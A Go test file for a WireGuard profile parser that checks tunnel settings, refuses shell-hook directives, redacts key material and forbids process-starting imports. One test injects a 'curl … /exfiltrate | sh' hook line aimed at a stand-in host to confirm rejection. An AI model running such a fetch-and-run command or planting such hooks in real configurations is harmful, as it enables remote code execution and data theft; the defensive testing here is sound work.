package network

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
)

const fullTunnel = `
# The office tunnel.
[Interface]
PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktMDAwMDAwMDA=
Address = 10.10.0.24/32, fd00:10::24/128
DNS = 10.10.0.1, fd00:10::1
MTU = 1380

[Peer]
PublicKey = cHVibGljLWtleS1vZi10aGUtb2ZmaWNlLWdhdGV3YXk=
PresharedKey = cHJlc2hhcmVkLWtleS1mb3ItdGhlLXR1bm5lbC0wMDA=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.org:51820
PersistentKeepalive = 25
`

const splitTunnel = `
[Interface]
PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktMDAwMDAwMDA=
Address = 192.168.90.7/24

[Peer]
PublicKey = cHVibGljLWtleS1vZi10aGUtb2ZmaWNlLWdhdGV3YXk=
AllowedIPs = 192.168.90.0/24, 10.4.0.0/16
Endpoint = 203.0.113.7:51820
`

func parseOrFail(t *testing.T, name, text string) (Profile, Secrets) {
	t.Helper()
	profile, secrets, err := ParseProfile(name, []byte(text))
	if err != nil {
		t.Fatalf("ParseProfile(%q): %v", name, err)
	}
	return profile, secrets
}

func TestParseProfilePreservesEverySupportedSetting(t *testing.T) {
	t.Parallel()

	profile, _ := parseOrFail(t, "office", fullTunnel)

	if profile.Name != "office" {
		t.Fatalf("name = %q, want office", profile.Name)
	}
	if got := strings.Join(profile.Addresses, ","); got != "10.10.0.24/32,fd00:10::24/128" {
		t.Fatalf("addresses = %q, want the IPv4 and IPv6 address in order", got)
	}
	if got := strings.Join(profile.DNS, ","); got != "10.10.0.1,fd00:10::1" {
		t.Fatalf("DNS = %q, want both resolvers", got)
	}
	if profile.MTU != 1380 {
		t.Fatalf("MTU = %d, want 1380", profile.MTU)
	}
	if len(profile.Peers) != 1 {
		t.Fatalf("parsed %d peers, want 1", len(profile.Peers))
	}
	peer := profile.Peers[0]
	if peer.PublicKey != "cHVibGljLWtleS1vZi10aGUtb2ZmaWNlLWdhdGV3YXk=" {
		t.Fatalf("peer public key = %q", peer.PublicKey)
	}
	if got := strings.Join(peer.AllowedIPs, ","); got != "0.0.0.0/0,::/0" {
		t.Fatalf("allowed addresses = %q, want the full IPv4 and IPv6 tunnel", got)
	}
	if peer.Endpoint != "vpn.example.org:51820" {
		t.Fatalf("endpoint = %q", peer.Endpoint)
	}
	if peer.PersistentKeepalive != 25 {
		t.Fatalf("keepalive = %d, want 25", peer.PersistentKeepalive)
	}
}

func TestParseProfileKeepsASplitTunnelSplit(t *testing.T) {
	t.Parallel()

	profile, _ := parseOrFail(t, "lab", splitTunnel)
	allowed := strings.Join(profile.Peers[0].AllowedIPs, ",")
	if allowed != "192.168.90.0/24,10.4.0.0/16" {
		t.Fatalf("allowed addresses = %q, want only the two named subnets", allowed)
	}
	if strings.Contains(allowed, "0.0.0.0/0") || strings.Contains(allowed, "::/0") {
		t.Fatal("a split tunnel was widened into a full tunnel")
	}
}

// A wg-quick profile is a shell-hook carrier as well as a tunnel description.
// Importing one may never run what the supplier wrote, so every executable
// directive is refused by name.
func TestParseProfileRejectsEveryExecutableDirective(t *testing.T) {
	t.Parallel()

	for _, directive := range []string{"PreUp", "PostUp", "PreDown", "PostDown"} {
		directive := directive
		t.Run(directive, func(t *testing.T) {
			t.Parallel()
			hostile := strings.Replace(fullTunnel, "MTU = 1380",
				fmt.Sprintf("MTU = 1380\n%s = curl https://example.invalid/exfiltrate | sh", directive), 1)

			profile, secrets, err := ParseProfile("hostile", []byte(hostile))
			if !errors.Is(err, ErrProfileRejected) {
				t.Fatalf("ParseProfile error = %v, want ErrProfileRejected", err)
			}
			if !strings.Contains(err.Error(), directive) {
				t.Fatalf("rejection %q does not name the offending directive %q", err, directive)
			}
			if profile.Name != "" || len(profile.Peers) != 0 {
				t.Fatalf("a rejected profile still produced a connection: %+v", profile)
			}
			if secrets.PrivateKey != "" {
				t.Fatal("a rejected profile still produced key material")
			}
		})
	}
}

// SaveConfig would let the tunnel rewrite its own stored definition, and Table
// and FwMark ask for routing policy this milestone does not manage. Each is
// refused rather than quietly dropped, so an operator is never told a profile
// was imported as written when part of it was discarded.
func TestParseProfileRejectsUnsupportedDirectivesByName(t *testing.T) {
	t.Parallel()

	for _, directive := range []string{"SaveConfig = true", "Table = off", "FwMark = 0x4d2", "Nonsense = 1"} {
		directive := directive
		t.Run(directive, func(t *testing.T) {
			t.Parallel()
			text := strings.Replace(fullTunnel, "MTU = 1380", "MTU = 1380\n"+directive, 1)
			_, _, err := ParseProfile("unsupported", []byte(text))
			if !errors.Is(err, ErrProfileRejected) {
				t.Fatalf("ParseProfile error = %v, want ErrProfileRejected", err)
			}
			name := strings.Split(directive, " ")[0]
			if !strings.Contains(err.Error(), name) {
				t.Fatalf("rejection %q does not name %q", err, name)
			}
		})
	}
}

// Key material leaves the parser in its own value and never in the profile, so
// no status response, listing or log built from a Profile can carry it.
func TestParseProfileSeparatesKeyMaterialFromTheProfile(t *testing.T) {
	t.Parallel()

	profile, secrets := parseOrFail(t, "office", fullTunnel)

	const privateKey = "aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktMDAwMDAwMDA="
	const presharedKey = "cHJlc2hhcmVkLWtleS1mb3ItdGhlLXR1bm5lbC0wMDA="
	if secrets.PrivateKey != privateKey {
		t.Fatalf("private key was not carried out in the secrets value")
	}
	if len(secrets.PresharedKeys) != 1 || secrets.PresharedKeys[0] != presharedKey {
		t.Fatalf("preshared key was not carried out in the secrets value: %v", secrets.PresharedKeys)
	}

	rendered, err := json.Marshal(profile)
	if err != nil {
		t.Fatalf("marshal profile: %v", err)
	}
	for _, secret := range []string{privateKey, presharedKey} {
		if strings.Contains(string(rendered), secret) {
			t.Fatalf("serialised profile carries key material: %s", rendered)
		}
	}
	if strings.Contains(fmt.Sprintf("%+v", profile), privateKey) {
		t.Fatal("formatting a profile prints its private key")
	}
}

// The secrets value itself has to survive being logged or serialised by
// accident, because that accident is exactly how key material escapes.
func TestSecretsRedactThemselvesWhenPrintedOrSerialised(t *testing.T) {
	t.Parallel()

	_, secrets := parseOrFail(t, "office", fullTunnel)
	const privateKey = "aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktMDAwMDAwMDA="

	for _, rendering := range []string{
		fmt.Sprintf("%v", secrets),
		fmt.Sprintf("%+v", secrets),
		fmt.Sprintf("%s", secrets),
		secrets.String(),
	} {
		if strings.Contains(rendering, privateKey) {
			t.Fatalf("a formatted secrets value printed the private key: %s", rendering)
		}
		if !strings.Contains(rendering, "redacted") {
			t.Fatalf("a formatted secrets value does not say it is redacted: %s", rendering)
		}
	}

	rendered, err := json.Marshal(secrets)
	if err != nil {
		t.Fatalf("marshal secrets: %v", err)
	}
	if strings.Contains(string(rendered), privateKey) {
		t.Fatalf("serialised secrets carry the private key: %s", rendered)
	}
}

// An imported profile is inactive and does not connect on its own. Autostart is
// a separate, explicit choice.
func TestAnImportedProfileIsInactiveAndDoesNotAutoConnect(t *testing.T) {
	t.Parallel()

	profile, _ := parseOrFail(t, "office", fullTunnel)
	connection := NewImportedConnection(profile)

	if connection.Active {
		t.Fatal("an imported profile was created active")
	}
	if connection.AutoConnect {
		t.Fatal("an imported profile was created with automatic connection enabled")
	}
	if !connection.NILOOwned {
		t.Fatal("an imported profile was not marked as owned by NILO")
	}
	if connection.Profile.Name != "office" {
		t.Fatalf("connection name = %q, want office", connection.Profile.Name)
	}
}

func TestParseProfileRefusesIncompleteOrUnusableInput(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		name string
		text string
	}{
		{name: "no interface section", text: "[Peer]\nPublicKey = k\nAllowedIPs = 0.0.0.0/0\n"},
		{name: "no private key", text: "[Interface]\nAddress = 10.0.0.1/32\n\n[Peer]\nPublicKey = k\nAllowedIPs = 0.0.0.0/0\n"},
		{name: "no address", text: "[Interface]\nPrivateKey = k\n\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n"},
		{name: "no peer", text: "[Interface]\nPrivateKey = k\nAddress = 10.0.0.1/32\n"},
		{name: "peer without a public key", text: "[Interface]\nPrivateKey = k\nAddress = 10.0.0.1/32\n\n[Peer]\nAllowedIPs = 0.0.0.0/0\n"},
		{name: "a directive outside any section", text: "MTU = 1400\n" + fullTunnel},
		{name: "an unknown section", text: fullTunnel + "\n[Routing]\nTable = 51820\n"},
		{name: "empty", text: ""},
	} {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			if _, _, err := ParseProfile("candidate", []byte(test.text)); err == nil {
				t.Fatalf("ParseProfile accepted %s", test.name)
			}
		})
	}
}

func TestParseProfileRequiresAUsableName(t *testing.T) {
	t.Parallel()

	for _, name := range []string{"", "   ", "../escape", "with/slash", strings.Repeat("n", 200)} {
		if _, _, err := ParseProfile(name, []byte(fullTunnel)); err == nil {
			t.Fatalf("ParseProfile accepted the name %q", name)
		}
	}
	if _, _, err := ParseProfile("office-2", []byte(fullTunnel)); err != nil {
		t.Fatalf("ParseProfile rejected an ordinary name: %v", err)
	}
}

func TestProfileValidationRejectsInvalidNetworkSettingsAndAcceptsDisabledKeepalive(t *testing.T) {
	valid := strings.ReplaceAll(fullTunnel, "fd00:10", "fd00:10")
	for _, tc := range []struct{ old, new string }{
		{"10.10.0.24/32", "999.1.2.3/24"},
		{"0.0.0.0/0", "10.0.0.1/99"},
		{"1380", "999999"},
		{"PersistentKeepalive = 25", "PersistentKeepalive = 999999"},
		{"vpn.example.org:51820", "vpn.example.org:99999"},
		{"PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktMDAwMDAwMDA=", "PrivateKey = invalid"},
		{"MTU = 1380", "MTU = 1380\nMTU = 1400"},
	} {
		if _, _, err := ParseProfile("office", []byte(strings.Replace(valid, tc.old, tc.new, 1))); err == nil {
			t.Errorf("accepted invalid setting %q", tc.new)
		}
	}
	if _, _, err := ParseProfile("office", []byte(strings.Replace(valid, "PersistentKeepalive = 25", "PersistentKeepalive = 0", 1))); err != nil {
		t.Errorf("disabled keepalive refused: %v", err)
	}
}

func TestProfileKeepsPresharedKeysAlignedWithPeers(t *testing.T) {
	text := splitTunnel + "\n[Peer]\nPublicKey = ERERERERERERERERERERERERERERERERERERERERERE=\nPresharedKey = cHJlc2hhcmVkLWtleS1mb3ItdGhlLXR1bm5lbC0wMDA=\nAllowedIPs = 10.5.0.0/16\n"
	_, secrets, err := ParseProfile("two", []byte(text))
	if err != nil {
		t.Fatal(err)
	}
	if len(secrets.PresharedKeys) != 2 || secrets.PresharedKeys[0] != "" || secrets.PresharedKeys[1] == "" {
		t.Fatal("preshared key lost its peer index")
	}
}

// The strongest statement that an imported profile is never executed is that
// this package has no way to execute anything: it does not import os/exec, and
// a future edit that added one would fail here rather than in review.
func TestTheNetworkPackageCannotStartAProcess(t *testing.T) {
	t.Parallel()

	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("read package directory: %v", err)
	}
	var scanned int
	for _, entry := range entries {
		// Implementation files only. A test may legitimately name these imports
		// — this one names both of them — and the constraint is on what the
		// package ships, not on what its tests mention.
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") ||
			strings.HasSuffix(entry.Name(), "_test.go") {
			continue
		}
		scanned++
		source, err := os.ReadFile(entry.Name())
		if err != nil {
			t.Fatalf("read %s: %v", entry.Name(), err)
		}
		for _, forbidden := range []string{`"os/exec"`, `"syscall"`} {
			if strings.Contains(string(source), forbidden) {
				t.Fatalf("%s imports %s, which would let an imported profile reach a process",
					entry.Name(), forbidden)
			}
		}
	}
	// A scan that silently matched nothing would pass forever.
	if scanned == 0 {
		t.Fatal("no implementation file was scanned")
	}
}

// Comments and blank lines are ordinary in a .conf file and carry no meaning.
func TestParseProfileIgnoresCommentsAndBlankLines(t *testing.T) {
	t.Parallel()

	commented := "# leading comment\n; another style\n\n" + fullTunnel + "\n# trailing\n"
	profile, _ := parseOrFail(t, "office", commented)
	if len(profile.Peers) != 1 || profile.MTU != 1380 {
		t.Fatalf("comments changed the parsed profile: %+v", profile)
	}
}
